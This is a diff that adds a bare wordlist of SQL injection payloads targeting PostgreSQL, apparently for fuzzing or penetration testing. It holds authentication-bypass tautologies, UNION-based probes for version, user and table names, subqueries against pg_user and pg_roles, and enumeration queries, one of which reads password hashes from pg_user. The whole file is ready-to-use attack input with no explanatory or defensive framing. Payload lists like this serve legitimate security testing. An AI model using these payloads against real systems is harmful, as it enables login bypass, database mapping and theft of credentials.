@@ -1,0 +1,24 @@
+' OR 1=1-- 
+' OR '1'='1-- 
+' OR 'a'='a-- 
+') OR '1'='1-- 
+' UNION SELECT NULL-- 
+' UNION SELECT version()-- 
+' UNION SELECT current_user-- 
+' UNION SELECT current_database()-- 
+' UNION SELECT table_name FROM information_schema.tables-- 
+' UNION SELECT table_schema || '.' || table_name FROM information_schema.tables-- 
+' AND 1=(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)-- 
+' AND 1=(SELECT 1 FROM pg_user LIMIT 1)-- 
+' AND 1=(SELECT 1 FROM pg_roles LIMIT 1)-- 
+'||(SELECT version())||'
+'||(SELECT current_database())||'
+SELECT version();
+SELECT current_database();
+SELECT current_user;
+SELECT datname FROM pg_database;
+SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','pg_catalog');
+SELECT usename, usesuper, passwd FROM pg_user;
+SELECT rolname, rolsuper FROM pg_roles;
+SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';
+
